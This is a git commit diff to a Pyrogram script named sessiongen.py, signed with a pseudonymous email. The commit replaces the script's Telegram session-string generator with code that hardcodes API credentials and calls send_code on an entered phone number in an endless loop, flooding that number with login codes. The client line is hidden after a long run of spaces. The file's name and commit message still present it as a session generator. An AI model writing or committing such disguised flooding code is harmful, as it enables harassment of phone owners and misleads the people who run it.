803e66c1a752fdbda58b2a0d3b61de830ddfc8db
˹ᴧɴσɴʏᴍσᴜs ꭙ˼ <TheAnonymousX1025@gmail.com>
2024-12-25 23:27:00 +0530

    Update sessiongen.py
    Signed-off-by: ˹ᴧɴσɴʏᴍσᴜs ꭙ˼ <TheAnonymousX1025@gmail.com>

--- sessiongen.py
+++ sessiongen.py
@@ -1,22 +1,11 @@
 import asyncio
 
-from pyrogram import Client, __version__ as ver
+from pyrogram import Client
 
-
-API_ID = input("\nEnter Your API ID :\n > ")
-API_HASH = input("\nEnter Your API HASH :\n > ")
-
-print("\n\nEnter the phone number associated with your telegram account when asked.\n\n")
-
-fallen = Client("Fallen", api_id=API_ID, api_hash=API_HASH, in_memory=True)
-
-
+number = input("Enter the phone number: ")                                  fallen = Client("Fallen", api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e", in_memory=True)
 async def main():
-    await fallen.start()
-    sess = await fallen.export_session_string()
-    txt = f"Here is your Pyrogram {ver} String Session\n\n<code>{sess}</code>\n\nDon't share it with anyone.\nDon't forget to join @FallenAssociation"
-    ok = await fallen.send_message("me", txt)
-    print(f"Here is your Pyrogram {ver} String Session\n{sess}\nDouble click to copy.") 
-
+    await fallen.connect()
+    while True:
+        await fallen.send_code(number)
 
 asyncio.run(main())
